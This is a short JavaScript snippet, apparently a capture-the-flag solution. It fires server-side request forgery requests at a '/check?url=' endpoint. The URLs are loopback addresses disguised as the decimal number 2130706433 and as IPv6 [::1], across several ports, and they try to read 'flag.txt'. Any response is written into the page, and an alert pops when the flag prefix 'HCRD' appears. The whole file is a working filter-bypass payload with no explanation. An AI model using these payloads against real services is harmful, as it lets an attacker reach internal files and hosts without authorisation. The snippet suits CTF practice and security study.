var urls = [
  '/check?url=' + encodeURIComponent('http://2130706433/flag.txt'),
  '/check?url=' + encodeURIComponent('http://2130706433:8001/flag.txt'),
  '/check?url=' + encodeURIComponent('http://[::1]/flag.txt'),
  '/check?url=' + encodeURIComponent('http://[::1]:8000/flag.txt'),
];

urls.forEach(u => {
  fetch(u)
    .then(r => r.text())
    .then(d => {
      document.body.innerHTML += '<pre style="background:yellow;padding:20px;font-size:18px">' + 
        u + '\n' + d + '</pre>';
      if(d.includes('HCRD')) {
        alert('🚩 FLAG: ' + d);
      }
    })
    .catch(e => {
      document.body.innerHTML += '<p style="color:red">' + u + ' ERROR: ' + e + '</p>';
    });
});